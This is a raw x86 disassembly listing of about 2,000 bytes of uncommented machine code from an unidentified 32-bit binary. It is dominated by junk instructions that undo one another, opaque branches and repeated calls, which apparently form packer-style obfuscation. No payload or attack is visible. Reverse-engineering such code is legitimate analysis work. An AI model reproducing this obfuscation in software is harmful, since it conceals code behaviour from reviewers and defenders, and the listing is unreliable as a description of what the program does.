  4032f1:	53                   	push   %ebx
  4032f2:	8d 44 24 34          	lea    0x34(%esp),%eax
  4032f6:	68 b4 02 00 00       	push   $0x2b4
  4032fb:	50                   	push   %eax
  4032fc:	53                   	push   %ebx
  4032fd:	68 a8 06 42 00       	push   $0x4206a8
  403302:	4b                   	dec    %ebx
  403303:	81 e8 cd f9 76 eb    	sub    $0xeb76f9cd,%eax
  403309:	03 cc                	add    %esp,%ecx
  40330b:	81 cb 5e 7d 18 26    	or     $0x26187d5e,%ebx
  403311:	c1 e3 13             	shl    $0x13,%ebx
  403314:	3b d9                	cmp    %ecx,%ebx
  403316:	78 06                	js     0x40331e
  403318:	81 eb 13 b1 bf 29    	sub    $0x29bfb113,%ebx
  40331e:	23 d3                	and    %ebx,%edx
  403320:	c1 e2 1d             	shl    $0x1d,%edx
  403323:	c1 c3 0d             	rol    $0xd,%ebx
  403326:	81 cf 1c 62 8b 47    	or     $0x478b621c,%edi
  40332c:	0b d3                	or     %ebx,%edx
  40332e:	f7 d7                	not    %edi
  403330:	c1 e3 0e             	shl    $0xe,%ebx
  403333:	81 e3 30 81 38 59    	and    $0x59388130,%ebx
  403339:	f7 d6                	not    %esi
  40333b:	4f                   	dec    %edi
  40333c:	f7 d0                	not    %eax
  40333e:	c1 ca 15             	ror    $0x15,%edx
  403341:	39 15 71 95 40 00    	cmp    %edx,0x409571
  403347:	7f 06                	jg     0x40334f
  403349:	2b 15 79 92 40 00    	sub    0x409279,%edx
  40334f:	87 d6                	xchg   %edx,%esi
  403351:	8b ff                	mov    %edi,%edi
  403353:	f7 df                	neg    %edi
  403355:	bf e7 59 dc c1       	mov    $0xc1dc59e7,%edi
  40335a:	81 c1 ee d5 8f 6e    	add    $0x6e8fd5ee,%ecx
  403360:	33 c6                	xor    %esi,%eax
  403362:	0b 3d eb 93 40 00    	or     0x4093eb,%edi
  403368:	bf 6c 57 65 c4       	mov    $0xc465576c,%edi
  40336d:	03 d6                	add    %esi,%edx
  40336f:	e8 83 23 00 00       	call   0x4056f7
  403374:	39 1d f9 93 40 00    	cmp    %ebx,0x4093f9
  40337a:	78 06                	js     0x403382
  40337c:	81 ca 76 0f 76 72    	or     $0x72760f76,%edx
  403382:	23 fb                	and    %ebx,%edi
  403384:	4f                   	dec    %edi
  403385:	81 c9 e3 55 81 aa    	or     $0xaa8155e3,%ecx
  40338b:	f7 d9                	neg    %ecx
  40338d:	b9 ef 3a a4 7d       	mov    $0x7da43aef,%ecx
  403392:	81 fb 2b d9 5c d8    	cmp    $0xd85cd92b,%ebx
  403398:	74 06                	je     0x4033a0
  40339a:	33 35 8a 92 40 00    	xor    0x40928a,%esi
  4033a0:	e8 62 1a 00 00       	call   0x404e07
  4033a5:	c1 ea 1a             	shr    $0x1a,%edx
  4033a8:	03 d3                	add    %ebx,%edx
  4033aa:	e8 13 e1 ff ff       	call   0x4014c2
  4033af:	85 ee                	test   %ebp,%esi
  4033b1:	73 03                	jae    0x4033b6
  4033b3:	c1 ef 0b             	shr    $0xb,%edi
  4033b6:	81 c6 9d 61 86 f5    	add    $0xf586619d,%esi
  4033bc:	23 d6                	and    %esi,%edx
  4033be:	ff c9                	dec    %ecx
  4033c0:	75 d0                	jne    0x403392
  4033c2:	33 dd                	xor    %ebp,%ebx
  4033c4:	c1 cb 19             	ror    $0x19,%ebx
  4033c7:	8b f7                	mov    %edi,%esi
  4033c9:	89 0d 30 93 42 00    	mov    %ecx,0x429330
  4033cf:	23 f8                	and    %eax,%edi
  4033d1:	f7 d6                	not    %esi
  4033d3:	33 f5                	xor    %ebp,%esi
  4033d5:	87 d7                	xchg   %edx,%edi
  4033d7:	2b c3                	sub    %ebx,%eax
  4033d9:	23 35 a6 95 40 00    	and    0x4095a6,%esi
  4033df:	87 d7                	xchg   %edx,%edi
  4033e1:	b9 c6 d0 6e 52       	mov    $0x526ed0c6,%ecx
  4033e6:	c1 c2 03             	rol    $0x3,%edx
  4033e9:	23 d2                	and    %edx,%edx
  4033eb:	f7 c1 7c 69 8a 2d    	test   $0x2d8a697c,%ecx
  4033f1:	70 03                	jo     0x4033f6
  4033f3:	c1 ca 11             	ror    $0x11,%edx
  4033f6:	bf 6f 66 aa 35       	mov    $0x35aa666f,%edi
  4033fb:	c1 ca 11             	ror    $0x11,%edx
  4033fe:	81 cf f1 17 9c 06    	or     $0x69c17f1,%edi
  403404:	f7 de                	neg    %esi
  403406:	0b 35 2e 94 40 00    	or     0x40942e,%esi
  40340c:	f7 d6                	not    %esi
  40340e:	f7 da                	neg    %edx
  403410:	c1 c2 18             	rol    $0x18,%edx
  403413:	bf ab 96 87 ba       	mov    $0xba8796ab,%edi
  403418:	89 3d d6 94 42 00    	mov    %edi,0x4294d6
  40341e:	40                   	inc    %eax
  40341f:	f7 d2                	not    %edx
  403421:	ff c9                	dec    %ecx
  403423:	75 c1                	jne    0x4033e6
  403425:	81 f7 e3 b4 4a ee    	xor    $0xee4ab4e3,%edi
  40342b:	f7 da                	neg    %edx
  40342d:	4e                   	dec    %esi
  40342e:	e8 0e e7 ff ff       	call   0x401b41
  403433:	81 fe 55 28 3a 0a    	cmp    $0xa3a2855,%esi
  403439:	7e 02                	jle    0x40343d
  40343b:	f7 d9                	neg    %ecx
  40343d:	8b d6                	mov    %esi,%edx
  40343f:	81 c3 39 8e d1 36    	add    $0x36d18e39,%ebx
  403445:	b9 3e 86 f8 6a       	mov    $0x6af8863e,%ecx
  40344a:	8b f7                	mov    %edi,%esi
  40344c:	0b f3                	or     %ebx,%esi
  40344e:	87 f2                	xchg   %esi,%edx
  403450:	4b                   	dec    %ebx
  403451:	c1 c0 1c             	rol    $0x1c,%eax
  403454:	89 3d 42 97 42 00    	mov    %edi,0x429742
  40345a:	f7 d6                	not    %esi
  40345c:	85 2d 0b 90 40 00    	test   %ebp,0x40900b
  403462:	7a 06                	jp     0x40346a
  403464:	23 05 13 95 40 00    	and    0x409513,%eax
  40346a:	23 d9                	and    %ecx,%ebx
  40346c:	81 c2 55 ac ff 6b    	add    $0x6bffac55,%edx
  403472:	0b 05 1e 93 40 00    	or     0x40931e,%eax
  403478:	09 05 07 94 42 00    	or     %eax,0x429407
  40347e:	ff c9                	dec    %ecx
  403480:	75 c8                	jne    0x40344a
  403482:	87 f2                	xchg   %esi,%edx
  403484:	c1 e0 1d             	shl    $0x1d,%eax
  403487:	09 05 3a 99 42 00    	or     %eax,0x42993a
  40348d:	e8 30 e0 ff ff       	call   0x4014c2
  403492:	c1 c1 06             	rol    $0x6,%ecx
  403495:	3b c6                	cmp    %esi,%eax
  403497:	77 05                	ja     0x40349e
  403499:	e8 69 19 00 00       	call   0x404e07
  40349e:	f7 da                	neg    %edx
  4034a0:	e8 ab fd ff ff       	call   0x403250
  4034a5:	c1 ee 14             	shr    $0x14,%esi
  4034a8:	81 e3 f5 4b 0c 98    	and    $0x980c4bf5,%ebx
  4034ae:	c1 c6 16             	rol    $0x16,%esi
  4034b1:	81 ee d9 bb 1b 8b    	sub    $0x8b1bbbd9,%esi
  4034b7:	e8 6b f7 ff ff       	call   0x402c27
  4034bc:	33 cb                	xor    %ebx,%ecx
  4034be:	87 d1                	xchg   %edx,%ecx
  4034c0:	2b c8                	sub    %eax,%ecx
  4034c2:	f7 d6                	not    %esi
  4034c4:	81 ea fd 93 84 8f    	sub    $0x8f8493fd,%edx
  4034ca:	e8 38 19 00 00       	call   0x404e07
  4034cf:	ba 49 51 5b 52       	mov    $0x525b5149,%edx
  4034d4:	f7 d2                	not    %edx
  4034d6:	33 dc                	xor    %esp,%ebx
  4034d8:	c1 c6 03             	rol    $0x3,%esi
  4034db:	33 c3                	xor    %ebx,%eax
  4034dd:	43                   	inc    %ebx
  4034de:	f7 d8                	neg    %eax
  4034e0:	81 eb 24 07 74 c0    	sub    $0xc0740724,%ebx
  4034e6:	e8 1c 19 00 00       	call   0x404e07
  4034eb:	09 0d bb 95 42 00    	or     %ecx,0x4295bb
  4034f1:	2b 15 15 9e 42 00    	sub    0x429e15,%edx
  4034f7:	e8 c6 df ff ff       	call   0x4014c2
  4034fc:	81 c3 24 07 74 c0    	add    $0xc0740724,%ebx
  403502:	f7 d8                	neg    %eax
  403504:	4b                   	dec    %ebx
  403505:	33 c3                	xor    %ebx,%eax
  403507:	c1 ce 03             	ror    $0x3,%esi
  40350a:	33 dc                	xor    %esp,%ebx
  40350c:	f7 d2                	not    %edx
  40350e:	81 ca 09 aa e9 06    	or     $0x6e9aa09,%edx
  403514:	09 1d 24 99 42 00    	or     %ebx,0x429924
  40351a:	40                   	inc    %eax
  40351b:	81 e9 e5 de 80 f1    	sub    $0xf180dee5,%ecx
  403521:	09 1d d7 97 42 00    	or     %ebx,0x4297d7
  403527:	2b 35 70 9a 42 00    	sub    0x429a70,%esi
  40352d:	c1 c7 1b             	rol    $0x1b,%edi
  403530:	33 0d 72 9d 42 00    	xor    0x429d72,%ecx
  403536:	f7 de                	neg    %esi
  403538:	e8 f5 2f 00 00       	call   0x406532
  40353d:	33 f9                	xor    %ecx,%edi
  40353f:	c1 c0 02             	rol    $0x2,%eax
  403542:	81 e9 ae 37 7a f7    	sub    $0xf77a37ae,%ecx
  403548:	f7 de                	neg    %esi
  40354a:	e8 e3 2f 00 00       	call   0x406532
  40354f:	f7 de                	neg    %esi
  403551:	81 c1 ae 37 7a f7    	add    $0xf77a37ae,%ecx
  403557:	c1 c8 02             	ror    $0x2,%eax
  40355a:	33 f9                	xor    %ecx,%edi
  40355c:	f7 de                	neg    %esi
  40355e:	c1 cf 1b             	ror    $0x1b,%edi
  403561:	09 15 69 97 42 00    	or     %edx,0x429769
  403567:	81 c1 e5 de 80 f1    	add    $0xf180dee5,%ecx
  40356d:	48                   	dec    %eax
  40356e:	31 3d 16 96 42 00    	xor    %edi,0x429616
  403574:	81 ea 49 fb fb 56    	sub    $0x56fbfb49,%edx
  40357a:	4a                   	dec    %edx
  40357b:	33 f1                	xor    %ecx,%esi
  40357d:	e8 74 21 00 00       	call   0x4056f6
  403582:	81 ee bb 74 30 45    	sub    $0x453074bb,%esi
  403588:	c1 c2 1f             	rol    $0x1f,%edx
  40358b:	81 f3 5f a9 f8 66    	xor    $0x66f8a95f,%ebx
  403591:	c1 c8 11             	ror    $0x11,%eax
  403594:	2b 35 c5 9e 42 00    	sub    0x429ec5,%esi
  40359a:	33 cc                	xor    %esp,%ecx
  40359c:	81 f3 cc 80 3b 30    	xor    $0x303b80cc,%ebx
  4035a2:	e8 60 18 00 00       	call   0x404e07
  4035a7:	2b 15 8f 9f 42 00    	sub    0x429f8f,%edx
  4035ad:	81 0d 5c 98 42 00 9b 	orl    $0x6253249b,0x42985c
  4035b4:	24 53 62 
  4035b7:	2b 0d 15 9b 42 00    	sub    0x429b15,%ecx
  4035bd:	0b 0d 9f 9a 42 00    	or     0x429a9f,%ecx
  4035c3:	33 cb                	xor    %ebx,%ecx
  4035c5:	2b f3                	sub    %ebx,%esi
  4035c7:	81 f2 65 cf 08 83    	xor    $0x8308cf65,%edx
  4035cd:	f7 d2                	not    %edx
  4035cf:	81 0d 9a 97 42 00 e0 	orl    $0x67ec54e0,0x42979a
  4035d6:	54 ec 67 
  4035d9:	81 35 28 94 42 00 ae 	xorl   $0x4b8bc9ae,0x429428
  4035e0:	c9 8b 4b 
  4035e3:	f7 d2                	not    %edx
  4035e5:	81 f2 65 cf 08 83    	xor    $0x8308cf65,%edx
  4035eb:	03 f3                	add    %ebx,%esi
  4035ed:	33 cb                	xor    %ebx,%ecx
  4035ef:	e8 c6 28 00 00       	call   0x405eba
  4035f4:	81 f3 cc 80 3b 30    	xor    $0x303b80cc,%ebx
  4035fa:	33 cc                	xor    %esp,%ecx
  4035fc:	c1 c0 11             	rol    $0x11,%eax
  4035ff:	81 f3 5f a9 f8 66    	xor    $0x66f8a95f,%ebx
  403605:	c1 ca 1f             	ror    $0x1f,%edx
  403608:	81 c6 bb 74 30 45    	add    $0x453074bb,%esi
  40360e:	e8 af de ff ff       	call   0x4014c2
  403613:	33 f1                	xor    %ecx,%esi
  403615:	42                   	inc    %edx
  403616:	52                   	push   %edx
  403617:	41                   	inc    %ecx
  403618:	e8 9d 28 00 00       	call   0x405eba
  40361d:	21 3d b3 94 42 00    	and    %edi,0x4294b3
  403623:	33 df                	xor    %edi,%ebx
  403625:	f7 d7                	not    %edi
  403627:	81 c2 79 2f 79 11    	add    $0x11792f79,%edx
  40362d:	0b 0d ef 9b 42 00    	or     0x429bef,%ecx
  403633:	e8 03 1f 00 00       	call   0x40553b
  403638:	2b 35 05 9e 42 00    	sub    0x429e05,%esi
  40363e:	e8 1e f3 ff ff       	call   0x402961
  403643:	09 0d 79 96 42 00    	or     %ecx,0x429679
  403649:	f7 d1                	not    %ecx
  40364b:	33 c1                	xor    %ecx,%eax
  40364d:	e8 0a 22 00 00       	call   0x40585c
  403652:	81 f6 9e e9 8b 6f    	xor    $0x6f8be99e,%esi
  403658:	87 f0                	xchg   %esi,%eax
  40365a:	0b 0d e8 99 42 00    	or     0x4299e8,%ecx
  403660:	87 f0                	xchg   %esi,%eax
  403662:	81 f6 9e e9 8b 6f    	xor    $0x6f8be99e,%esi
  403668:	e8 55 de ff ff       	call   0x4014c2
  40366d:	33 c1                	xor    %ecx,%eax
  40366f:	f7 d1                	not    %ecx
  403671:	31 3d 17 93 42 00    	xor    %edi,0x429317
  403677:	e8 d4 fb ff ff       	call   0x403250
  40367c:	e8 b8 2a 00 00       	call   0x406139
  403681:	81 ea 79 2f 79 11    	sub    $0x11792f79,%edx
  403687:	f7 d7                	not    %edi
  403689:	33 df                	xor    %edi,%ebx
  40368b:	01 05 98 98 42 00    	add    %eax,0x429898
  403691:	e8 2c de ff ff       	call   0x4014c2
  403696:	49                   	dec    %ecx
  403697:	b8 6e 34 93 c9       	mov    $0xc993346e,%eax
  40369c:	03 f8                	add    %eax,%edi
  40369e:	81 05 77 95 42 00 b3 	addl   $0x836098b3,0x429577
  4036a5:	98 60 83 
  4036a8:	f7 d8                	neg    %eax
  4036aa:	e8 ad 21 00 00       	call   0x40585c
  4036af:	2b 1d 3d 9f 42 00    	sub    0x429f3d,%ebx
  4036b5:	e8 4d 17 00 00       	call   0x404e07
  4036ba:	c1 cb 13             	ror    $0x13,%ebx
  4036bd:	81 35 d4 96 42 00 78 	xorl   $0x5186c878,0x4296d4
  4036c4:	c8 86 51 
  4036c7:	03 35 ba 9e 42 00    	add    0x429eba,%esi
  4036cd:	03 15 da 9d 42 00    	add    0x429dda,%edx
  4036d3:	e8 2f 17 00 00       	call   0x404e07
  4036d8:	e8 2a 17 00 00       	call   0x404e07
  4036dd:	c1 c3 13             	rol    $0x13,%ebx
  4036e0:	f7 d8                	neg    %eax
  4036e2:	2b f8                	sub    %eax,%edi
  4036e4:	81 e8 d2 cd 9d 29    	sub    $0x299dcdd2,%eax
  4036ea:	87 d0                	xchg   %edx,%eax
  4036ec:	0b 35 65 9b 42 00    	or     0x429b65,%esi
  4036f2:	c1 c7 0e             	rol    $0xe,%edi
  4036f5:	21 05 0e 98 42 00    	and    %eax,0x42980e
  4036fb:	c7 05 33 94 42 00 40 	movl   $0x45926940,0x429433
  403702:	69 92 45 
  403705:	81 f3 7d 35 b9 66    	xor    $0x66b9357d,%ebx
  40370b:	c1 ce 1b             	ror    $0x1b,%esi
  40370e:	e8 f4 16 00 00       	call   0x404e07
  403713:	0b 35 48 9e 42 00    	or     0x429e48,%esi
  403719:	c1 cb 03             	ror    $0x3,%ebx
  40371c:	01 05 a1 93 42 00    	add    %eax,0x4293a1
  403722:	21 3d 51 96 42 00    	and    %edi,0x429651
  403728:	33 f9                	xor    %ecx,%edi
  40372a:	2b 05 3d 9b 42 00    	sub    0x429b3d,%eax
  403730:	33 de                	xor    %esi,%ebx
  403732:	81 e9 58 c2 d3 22    	sub    $0x22d3c258,%ecx
  403738:	f7 d9                	neg    %ecx
  40373a:	c1 ce 04             	ror    $0x4,%esi
  40373d:	f7 de                	neg    %esi
  40373f:	31 15 dc 95 42 00    	xor    %edx,0x4295dc
  403745:	e8 f1 1d 00 00       	call   0x40553b
  40374a:	03 05 bf 9e 42 00    	add    0x429ebf,%eax
  403750:	f7 de                	neg    %esi
  403752:	c1 c6 04             	rol    $0x4,%esi
  403755:	f7 d9                	neg    %ecx
  403757:	81 c1 58 c2 d3 22    	add    $0x22d3c258,%ecx
  40375d:	33 de                	xor    %esi,%ebx
  40375f:	33 f9                	xor    %ecx,%edi
  403761:	89 3d 1d 97 42 00    	mov    %edi,0x42971d
  403767:	29 3d a6 93 42 00    	sub    %edi,0x4293a6
  40376d:	c1 c3 03             	rol    $0x3,%ebx
  403770:	c1 c6 1b             	rol    $0x1b,%esi
  403773:	81 f3 7d 35 b9 66    	xor    $0x66b9357d,%ebx
  403779:	29 05 b8 97 42 00    	sub    %eax,0x4297b8
  40377f:	c1 cf 0e             	ror    $0xe,%edi
  403782:	87 d0                	xchg   %edx,%eax
  403784:	81 f0 f9 0a c6 ad    	xor    $0xadc60af9,%eax
  40378a:	f7 da                	neg    %edx
  40378c:	46                   	inc    %esi
  40378d:	31 0d 72 96 42 00    	xor    %ecx,0x429672
  403793:	03 da                	add    %edx,%ebx
  403795:	01 0d ad 97 42 00    	add    %ecx,0x4297ad
  40379b:	0b 15 9a 9b 42 00    	or     0x429b9a,%edx
  4037a1:	09 3d 33 98 42 00    	or     %edi,0x429833
  4037a7:	47                   	inc    %edi
  4037a8:	31 05 6f 96 42 00    	xor    %eax,0x42966f
  4037ae:	89 1d 49 96 42 00    	mov    %ebx,0x429649
  4037b4:	81 c7 ba e6 77 4b    	add    $0x4b77e6ba,%edi
  4037ba:	03 15 79 9f 42 00    	add    0x429f79,%edx
  4037c0:	0b 0d 5c 9c 42 00    	or     0x429c5c,%ecx
  4037c6:	e8 3c 16 00 00       	call   0x404e07
  4037cb:	e8 48 e1 ff ff       	call   0x401918
  4037d0:	81 ef ba e6 77 4b    	sub    $0x4b77e6ba,%edi
  4037d6:	31 0d 49 97 42 00    	xor    %ecx,0x429749
  4037dc:	4f                   	dec    %edi
  4037dd:	89 15 d4 97 42 00    	mov    %edx,0x4297d4
  4037e3:	2b da                	sub    %edx,%ebx
  4037e5:	21 15 7c 95 42 00    	and    %edx,0x42957c
  4037eb:	4e                   	dec    %esi
  4037ec:	f7 da                	neg    %edx
  4037ee:	50                   	push   %eax
  4037ef:	c1 cf 04             	ror    $0x4,%edi
  4037f2:	e8 21 e1 ff ff       	call   0x401918
  4037f7:	03 dd                	add    %ebp,%ebx
  4037f9:	e8 09 16 00 00       	call   0x404e07
  4037fe:	33 f0                	xor    %eax,%esi
  403800:	c1 ca 16             	ror    $0x16,%edx
  403803:	81 c1 ab 51 b3 56    	add    $0x56b351ab,%ecx
  403809:	f7 da                	neg    %edx
  40380b:	01 1d 39 94 42 00    	add    %ebx,0x429439
  403811:	33 cd                	xor    %ebp,%ecx
  403813:	03 ca                	add    %edx,%ecx
  403815:	81 35 1f 97 42 00 3d 	xorl   $0xc22ec73d,0x42971f
  40381c:	c7 2e c2 
  40381f:	f7 da                	neg    %edx
  403821:	09 35 0c 99 42 00    	or     %esi,0x42990c
  403827:	21 35 24 99 42 00    	and    %esi,0x429924
  40382d:	03 0d d7 9d 42 00    	add    0x429dd7,%ecx
  403833:	29 35 17 93 42 00    	sub    %esi,0x429317
  403839:	c1 c0 19             	rol    $0x19,%eax
  40383c:	03 d8                	add    %eax,%ebx
  40383e:	e8 67 f5 ff ff       	call   0x402daa
  403843:	e8 73 ef ff ff       	call   0x4027bb
  403848:	2b d8                	sub    %eax,%ebx
  40384a:	c1 c8 19             	ror    $0x19,%eax
  40384d:	01 15 e2 94 42 00    	add    %edx,0x4294e2
  403853:	31 3d e0 95 42 00    	xor    %edi,0x4295e0
  403859:	f7 da                	neg    %edx
  40385b:	81 0d a5 98 42 00 1a 	orl    $0x378da81a,0x4298a5
  403862:	a8 8d 37 
  403865:	2b ca                	sub    %edx,%ecx
  403867:	33 cd                	xor    %ebp,%ecx
  403869:	f7 da                	neg    %edx
  40386b:	81 e9 ab 51 b3 56    	sub    $0x56b351ab,%ecx
  403871:	c1 c2 16             	rol    $0x16,%edx
  403874:	33 f0                	xor    %eax,%esi
  403876:	2b dd                	sub    %ebp,%ebx
  403878:	c1 c7 04             	rol    $0x4,%edi
  40387b:	b9 57 01 b6 13       	mov    $0x13b60157,%ecx
  403880:	2b 1d 94 9c 42 00    	sub    0x429c94,%ebx
  403886:	81 c2 d5 3d ab 02    	add    $0x2ab3dd5,%edx
  40388c:	c1 c6 14             	rol    $0x14,%esi
  40388f:	4a                   	dec    %edx
  403890:	f7 da                	neg    %edx
  403892:	87 d1                	xchg   %edx,%ecx
  403894:	33 05 fd 9e 42 00    	xor    0x429efd,%eax
  40389a:	87 f2                	xchg   %esi,%edx
  40389c:	f7 d6                	not    %esi
  40389e:	c1 ca 04             	ror    $0x4,%edx
  4038a1:	81 ea b6 a8 da 65    	sub    $0x65daa8b6,%edx
  4038a7:	81 c2 b6 a8 da 65    	add    $0x65daa8b6,%edx
  4038ad:	c1 c2 04             	rol    $0x4,%edx
  4038b0:	f7 d6                	not    %esi
  4038b2:	87 f2                	xchg   %esi,%edx
  4038b4:	87 d1                	xchg   %edx,%ecx
  4038b6:	f7 da                	neg    %edx
  4038b8:	42                   	inc    %edx
  4038b9:	c1 ce 14             	ror    $0x14,%esi
  4038bc:	81 ea d5 3d ab 02    	sub    $0x2ab3dd5,%edx
  4038c2:	81 c1 65 64 3b 13    	add    $0x133b6465,%ecx
  4038c8:	03 d8                	add    %eax,%ebx
  4038ca:	49                   	dec    %ecx
  4038cb:	03 da                	add    %edx,%ebx
  4038cd:	f7 d6                	not    %esi
  4038cf:	e8 6f e4 ff ff       	call   0x401d43
  4038d4:	81 f1 06 55 88 af    	xor    $0xaf885506,%ecx
  4038da:	81 ea 5a fa 1c 28    	sub    $0x281cfa5a,%edx
  4038e0:	81 f0 be e3 9d 9c    	xor    $0x9c9de3be,%eax
  4038e6:	81 35 26 95 42 00 37 	xorl   $0x9eca4237,0x429526
  4038ed:	42 ca 9e 
  4038f0:	e8 12 15 00 00       	call   0x404e07
  4038f5:	e8 49 e4 ff ff       	call   0x401d43
  4038fa:	81 05 8f 93 42 00 65 	addl   $0x5efc1d65,0x42938f
  403901:	1d fc 5e 
  403904:	81 f0 be e3 9d 9c    	xor    $0x9c9de3be,%eax
  40390a:	81 c2 5a fa 1c 28    	add    $0x281cfa5a,%edx
  403910:	81 f1 06 55 88 af    	xor    $0xaf885506,%ecx
  403916:	e8 0c f3 ff ff       	call   0x402c27
  40391b:	f7 d6                	not    %esi
  40391d:	2b da                	sub    %edx,%ebx
  40391f:	41                   	inc    %ecx
  403920:	2b d8                	sub    %eax,%ebx
  403922:	81 c1 af ff 80 47    	add    $0x4780ffaf,%ecx
  403928:	48                   	dec    %eax
  403929:	21 15 95 93 42 00    	and    %edx,0x429395
  40392f:	03 35 08 9e 42 00    	add    0x429e08,%esi
  403935:	81 f6 3a c9 be 9c    	xor    $0x9cbec93a,%esi
  40393b:	e8 c7 14 00 00       	call   0x404e07
  403940:	03 05 d7 9e 42 00    	add    0x429ed7,%eax
  403946:	47                   	inc    %edi
  403947:	87 f2                	xchg   %esi,%edx
  403949:	33 d1                	xor    %ecx,%edx
  40394b:	21 15 0c 93 42 00    	and    %edx,0x42930c
  403951:	48                   	dec    %eax
  403952:	81 f6 e5 76 c7 9f    	xor    $0x9fc776e5,%esi
  403958:	0b 3d 5b 9e 42 00    	or     0x429e5b,%edi
  40395e:	f7 d3                	not    %ebx
  403960:	e8 55 25 00 00       	call   0x405eba
  403965:	c1 c7 10             	rol    $0x10,%edi
  403968:	f7 db                	neg    %ebx
  40396a:	09 0d 06 95 42 00    	or     %ecx,0x429506
  403970:	29 0d 56 98 42 00    	sub    %ecx,0x429856
  403976:	f7 db                	neg    %ebx
  403978:	c1 cf 10             	ror    $0x10,%edi
  40397b:	f7 d3                	not    %ebx
  40397d:	81 f6 e5 76 c7 9f    	xor    $0x9fc776e5,%esi
  403983:	40                   	inc    %eax
  403984:	31 05 be 95 42 00    	xor    %eax,0x4295be
  40398a:	33 d1                	xor    %ecx,%edx
  40398c:	87 f2                	xchg   %esi,%edx
  40398e:	4f                   	dec    %edi
  40398f:	81 f6 3a c9 be 9c    	xor    $0x9cbec93a,%esi
  403995:	40                   	inc    %eax
  403996:	51                   	push   %ecx
  403997:	87 f2                	xchg   %esi,%edx
  403999:	81 c2 7c 30 26 f0    	add    $0xf026307c,%edx
  40399f:	f7 d8                	neg    %eax
  4039a1:	33 1d 72 9a 42 00    	xor    0x429a72,%ebx
  4039a7:	f7 d2                	not    %edx
  4039a9:	87 f0                	xchg   %esi,%eax
  4039ab:	e8 b1 ef ff ff       	call   0x402961
  4039b0:	f7 d1                	not    %ecx
  4039b2:	03 05 d4 9c 42 00    	add    0x429cd4,%eax
  4039b8:	2b f5                	sub    %ebp,%esi
  4039ba:	f7 de                	neg    %esi
  4039bc:	81 05 df 96 42 00 b2 	addl   $0x6ae831b2,0x4296df
  4039c3:	31 e8 6a 
  4039c6:	2b d1                	sub    %ecx,%edx
  4039c8:	c1 c7 12             	rol    $0x12,%edi
  4039cb:	81 f1 5b ca a8 54    	xor    $0x54a8ca5b,%ecx
  4039d1:	03 0d 47 9f 42 00    	add    0x429f47,%ecx
  4039d7:	e8 2b 14 00 00       	call   0x404e07
  4039dc:	29 1d a9 93 42 00    	sub    %ebx,0x4293a9
  4039e2:	01 15 1d 98 42 00    	add    %edx,0x42981d
  4039e8:	e8 4e 1b 00 00       	call   0x40553b
  4039ed:	81 f1 5b ca a8 54    	xor    $0x54a8ca5b,%ecx
  4039f3:	c1 cf 12             	ror    $0x12,%edi
  4039f6:	03 d1                	add    %ecx,%edx
  4039f8:	81 05 2e 98 42 00 2d 	addl   $0x7f2f842d,0x42982e
  4039ff:	84 2f 7f 
  403a02:	f7 de                	neg    %esi
  403a04:	03 f5                	add    %ebp,%esi
  403a06:	f7 d1                	not    %ecx
  403a08:	e8 1a f2 ff ff       	call   0x402c27
  403a0d:	87 f0                	xchg   %esi,%eax
  403a0f:	f7 d2                	not    %edx
  403a11:	f7 d8                	neg    %eax
  403a13:	81 ea 7c 30 26 f0    	sub    $0xf026307c,%edx
  403a19:	87 f2                	xchg   %esi,%edx
  403a1b:	54                   	push   %esp
  403a1c:	31 15 fc 94 42 00    	xor    %edx,0x4294fc
  403a22:	e8 12 27 00 00       	call   0x406139
  403a27:	2b 05 c5 9e 42 00    	sub    0x429ec5,%eax
  403a2d:	87 c7                	xchg   %eax,%edi
  403a2f:	03 1d 47 9d 42 00    	add    0x429d47,%ebx
  403a35:	f7 d1                	not    %ecx
  403a37:	2b d6                	sub    %esi,%edx
  403a39:	29 05 4a 94 42 00    	sub    %eax,0x42944a
  403a3f:	49                   	dec    %ecx
  403a40:	33 05 f0 9e 42 00    	xor    0x429ef0,%eax
  403a46:	29 3d 4a 98 42 00    	sub    %edi,0x42984a
  403a4c:	03 d9                	add    %ecx,%ebx
  403a4e:	f7 db                	neg    %ebx
  403a50:	33 cc                	xor    %esp,%ecx
  403a52:	42                   	inc    %edx
  403a53:	03 c1                	add    %ecx,%eax
  403a55:	33 3d 5b 9c 42 00    	xor    0x429c5b,%edi
  403a5b:	e8 77 ed ff ff       	call   0x4027d7
  403a60:	e8 c2 f1 ff ff       	call   0x402c27
  403a65:	2b c1                	sub    %ecx,%eax
  403a67:	4a                   	dec    %edx
  403a68:	33 cc                	xor    %esp,%ecx
  403a6a:	f7 db                	neg    %ebx
  403a6c:	2b d9                	sub    %ecx,%ebx
  403a6e:	41                   	inc    %ecx
  403a6f:	09 3d 3d 99 42 00    	or     %edi,0x42993d
  403a75:	03 d6                	add    %esi,%edx
  403a77:	f7 d1                	not    %ecx
  403a79:	87 c7                	xchg   %eax,%edi
  403a7b:	ff 15 04 71 40 00    	call   *0x407104
  403a81:	03 0d 13 9b 42 00    	add    0x429b13,%ecx
  403a87:	4b                   	dec    %ebx
  403a88:	81 ea 63 97 fd 83    	sub    $0x83fd9763,%edx
  403a8e:	0b 0d 73 9f 42 00    	or     0x429f73,%ecx
  403a94:	09 05 12 96 42 00    	or     %eax,0x429612
  403a9a:	31 35 19 93 42 00    	xor    %esi,0x429319
  403aa0:	81 f7 eb 57 1c 69    	xor    $0x691c57eb,%edi
  403aa6:	c1 c2 1d             	rol    $0x1d,%edx
  403aa9:	03 1d 1e 9b 42 00    	add    0x429b1e,%ebx
  403aaf:	e8 53 13 00 00       	call   0x404e07
  403ab4:	81 c7 4c c3 84 3d    	add    $0x3d84c34c,%edi
  403aba:	c1 cb 0c             	ror    $0xc,%ebx
  403abd:	41                   	inc    %ecx
  403abe:	0b 05 86 9d 42 00    	or     0x429d86,%eax
  403ac4:	49                   	dec    %ecx
  403ac5:	c1 c3 0c             	rol    $0xc,%ebx
  403ac8:	81 ef 4c c3 84 3d    	sub    $0x3d84c34c,%edi
  403ace:	e8 34 13 00 00       	call   0x404e07
  403ad3:	c1 ca 1d             	ror    $0x1d,%edx
  403ad6:	81 f7 eb 57 1c 69    	xor    $0x691c57eb,%edi
  403adc:	09 3d 7f 93 42 00    	or     %edi,0x42937f
  403ae2:	81 c2 63 97 fd 83    	add    $0x83fd9763,%edx
  403ae8:	43                   	inc    %ebx
  403ae9:	83 c4 0c             	add    $0xc,%esp
  403aec:	33 da                	xor    %edx,%ebx
  403aee:	f7 de                	neg    %esi
  403af0:	c1 c3 1f             	rol    $0x1f,%ebx
  403af3:	81 ef 49 5f 54 ac    	sub    $0xac545f49,%edi
  403af9:	49                   	dec    %ecx
  403afa:	c1 ce 17             	ror    $0x17,%esi
